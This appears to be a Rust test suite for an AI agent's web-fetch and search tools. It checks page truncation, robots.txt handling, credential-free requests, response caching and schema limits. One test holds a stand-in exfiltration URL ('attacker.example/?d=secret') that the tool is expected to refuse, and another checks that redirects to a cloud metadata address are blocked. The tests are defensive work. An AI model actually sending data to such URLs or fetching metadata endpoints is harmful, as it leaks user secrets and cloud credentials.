use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::TcpListener;
use std::sync::atomic::{AtomicUsize, Ordering};

use super::*;

#[derive(Clone)]
struct Route {
    status: &'static str,
    content_type: &'static str,
    body: Vec<u8>,
}

fn route(status: &'static str, content_type: &'static str, body: impl Into<Vec<u8>>) -> Route {
    Route {
        status,
        content_type,
        body: body.into(),
    }
}

struct Site {
    base: String,
    requests: Arc<Mutex<Vec<String>>>,
    hits: Arc<AtomicUsize>,
}

/// A local site serving `routes` by path; unknown paths are 404.
fn site(routes: Vec<(&'static str, Route)>) -> Site {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let routes: HashMap<&'static str, Route> = routes.into_iter().collect();
    let requests: Arc<Mutex<Vec<String>>> = Arc::default();
    let hits = Arc::new(AtomicUsize::new(0));
    let recorded = requests.clone();
    let counted = hits.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut stream) = stream else {
                return;
            };
            let mut buffer = [0u8; 8192];
            let mut raw = Vec::new();
            loop {
                let read = stream.read(&mut buffer).unwrap_or(0);
                if read == 0 {
                    break;
                }
                raw.extend_from_slice(&buffer[..read]);
                if raw.windows(4).any(|window| window == b"\r\n\r\n") {
                    break;
                }
            }
            let request = String::from_utf8_lossy(&raw).into_owned();
            let path = request.split_whitespace().nth(1).unwrap_or("/").to_string();
            if path != "/robots.txt" {
                counted.fetch_add(1, Ordering::SeqCst);
            }
            recorded.lock().unwrap().push(request);
            let reply = routes
                .get(path.as_str())
                .cloned()
                .unwrap_or_else(|| route("404 Not Found", "text/plain", "missing"));
            let head = format!(
                "HTTP/1.1 {}\r\nContent-Type: {}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                reply.status,
                reply.content_type,
                reply.body.len()
            );
            let _ = stream.write_all(head.as_bytes());
            let _ = stream.write_all(&reply.body);
        }
    });
    Site {
        base,
        requests,
        hits,
    }
}

fn options() -> WebFetchOptions {
    WebFetchOptions {
        user_agent: "Oleafly/test".into(),
        ..WebFetchOptions::default()
    }
}

fn fetch_call(url: &str, offset: Option<usize>) -> ToolCall {
    let mut arguments = json!({ "url": url });
    if let Some(offset) = offset {
        arguments["offset"] = json!(offset);
    }
    ToolCall {
        id: "w".into(),
        name: WEB_FETCH_TOOL.into(),
        arguments: arguments.to_string(),
        ..Default::default()
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn large_pages_are_truncated_at_five_megabytes() {
    let site = site(vec![(
        "/big",
        route("200 OK", "text/plain", vec![b'a'; 6 * 1024 * 1024]),
    )]);
    let page = web_fetch(
        &WebClient::for_tests(),
        &format!("{}/big", site.base),
        &options(),
    )
    .await
    .unwrap();
    assert!(page.truncated);
    assert!(page.markdown.len() <= MAX_FETCH_BYTES);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn pdfs_and_binary_types_are_reported_not_parsed() {
    let site = site(vec![
        ("/paper.pdf", route("200 OK", "application/pdf", "%PDF-1.7")),
        (
            "/logo.png",
            route("200 OK", "image/png", vec![0x89, b'P', b'N', b'G']),
        ),
    ]);
    let client = WebClient::for_tests();
    let pdf = web_fetch(&client, &format!("{}/paper.pdf", site.base), &options())
        .await
        .unwrap_err();
    assert!(pdf.to_string().contains("This is a PDF"));
    let png = web_fetch(&client, &format!("{}/logo.png", site.base), &options())
        .await
        .unwrap_err();
    assert_eq!(png.to_string(), "This content type is not supported.");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn robots_disallow_stops_the_fetch() {
    let page = route("200 OK", "text/plain", "hello");
    let closed = site(vec![
        (
            "/robots.txt",
            route("200 OK", "text/plain", "User-agent: *\nDisallow: /\n"),
        ),
        ("/p", page.clone()),
    ]);
    let error = web_fetch(
        &WebClient::for_tests(),
        &format!("{}/p", closed.base),
        &options(),
    )
    .await
    .unwrap_err();
    assert!(matches!(
        error,
        WebError::Robots {
            unreachable: false,
            ..
        }
    ));
    assert_eq!(closed.hits.load(Ordering::SeqCst), 0);

    let broken = site(vec![
        (
            "/robots.txt",
            route("503 Service Unavailable", "text/plain", ""),
        ),
        ("/p", page.clone()),
    ]);
    let error = web_fetch(
        &WebClient::for_tests(),
        &format!("{}/p", broken.base),
        &options(),
    )
    .await
    .unwrap_err();
    assert!(matches!(
        error,
        WebError::Robots {
            unreachable: true,
            ..
        }
    ));

    let open = site(vec![("/p", page)]);
    let fetched = web_fetch(
        &WebClient::for_tests(),
        &format!("{}/p", open.base),
        &options(),
    )
    .await
    .unwrap();
    assert_eq!(fetched.markdown, "hello");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn the_fetch_sends_no_cookies_or_credentials() {
    let site = site(vec![(
        "/p",
        route("200 OK", "text/html", "<html><body><p>hi</p></body></html>"),
    )]);
    web_fetch(
        &WebClient::for_tests(),
        &format!("{}/p", site.base),
        &options(),
    )
    .await
    .unwrap();
    let requests = site.requests.lock().unwrap().clone();
    let page_request = requests
        .iter()
        .find(|request| request.starts_with("GET /p "))
        .unwrap()
        .to_ascii_lowercase();
    assert!(!page_request.contains("\r\ncookie:"));
    assert!(!page_request.contains("\r\nauthorization:"));
    assert!(page_request.contains("\r\nuser-agent: oleafly"));
}

#[test]
fn a_redirect_to_a_private_address_is_blocked() {
    assert!(!client::redirect_allowed(
        &Url::parse("https://127.0.0.1/").unwrap(),
        1
    ));
    assert!(!client::redirect_allowed(
        &Url::parse("https://169.254.169.254/latest/meta-data").unwrap(),
        1
    ));
    assert!(client::redirect_allowed(
        &Url::parse("https://example.org/").unwrap(),
        1
    ));
}

#[tokio::test]
async fn unseen_urls_are_refused_with_guidance() {
    let ctx = WebToolContext::for_tests(None);
    let output = run_web_tool(
        &ctx,
        &fetch_call("https://attacker.example/?d=secret", None),
    )
    .await
    .unwrap();
    assert!(output
        .output
        .contains("has not appeared in this conversation"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn fetched_content_stays_under_the_output_cap_and_pages_by_offset() {
    let text: String = "研究論文の本文。".repeat(40_000);
    assert!(text.len() > 300_000);
    let site = site(vec![(
        "/long",
        route("200 OK", "text/plain; charset=utf-8", text.clone()),
    )]);
    let url = format!("{}/long", site.base);
    let ctx = WebToolContext::for_tests(None);
    ctx.observe_text(&format!("Please read {url}"));
    let first = run_web_tool(&ctx, &fetch_call(&url, None)).await.unwrap();
    assert!(
        first.output.len() <= MAX_OUTPUT_BYTES,
        "{}",
        first.output.len()
    );
    let first: Value = serde_json::from_str(&first.output).unwrap();
    let next = first["next_offset"].as_u64().unwrap() as usize;
    assert!(next > 0);
    let second = run_web_tool(&ctx, &fetch_call(&url, Some(next)))
        .await
        .unwrap();
    assert!(second.output.len() <= MAX_OUTPUT_BYTES);
    let second: Value = serde_json::from_str(&second.output).unwrap();
    assert_eq!(second["offset"].as_u64(), Some(next as u64));
    let expected: String = text.chars().skip(next).take(10).collect();
    assert!(second["content"].as_str().unwrap().starts_with(&expected));
    assert_eq!(
        site.hits.load(Ordering::SeqCst),
        1,
        "the second page came from the cache"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn the_runner_records_urls_from_other_tools() {
    let site = site(vec![("/p", route("200 OK", "text/plain", "page body"))]);
    let url = format!("{}/p", site.base);
    let ctx = Arc::new(WebToolContext::for_tests(None));
    let mentioned = url.clone();
    let inner: ToolRunner = Arc::new(move |_| {
        let mentioned = mentioned.clone();
        Box::pin(async move { ToolOutput::text(format!("see {mentioned}")) })
    });
    let runner = web_tool_runner(ctx, inner);
    runner(ToolCall {
        id: "r".into(),
        name: "read_file".into(),
        arguments: "{}".into(),
        ..Default::default()
    })
    .await;
    let output = runner(fetch_call(&url, None)).await;
    assert!(output.output.contains("page body"), "{}", output.output);
}

#[tokio::test]
async fn search_without_a_key_explains_how_to_add_one() {
    let ctx = WebToolContext::for_tests(None);
    assert!(!ctx.has_search());
    let output = run_web_tool(
        &ctx,
        &ToolCall {
            id: "s".into(),
            name: WEB_SEARCH_TOOL.into(),
            arguments: r#"{"query":"claude shannon"}"#.into(),
            ..Default::default()
        },
    )
    .await
    .unwrap();
    assert!(output.output.contains("Settings"), "{}", output.output);
}

#[test]
fn the_tool_schemas_refuse_extra_arguments() {
    for schema in [web_search_schema(), web_fetch_schema()] {
        assert_eq!(schema.input_schema["additionalProperties"], false);
    }
    assert_eq!(
        web_search_schema().input_schema["properties"]["query"]["maxLength"],
        400
    );
}

#[test]
fn other_tools_are_not_web_tools() {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    let ctx = WebToolContext::for_tests(None);
    let output = runtime.block_on(run_web_tool(
        &ctx,
        &ToolCall {
            name: "read_file".into(),
            ..Default::default()
        },
    ));
    assert!(output.is_none());
}
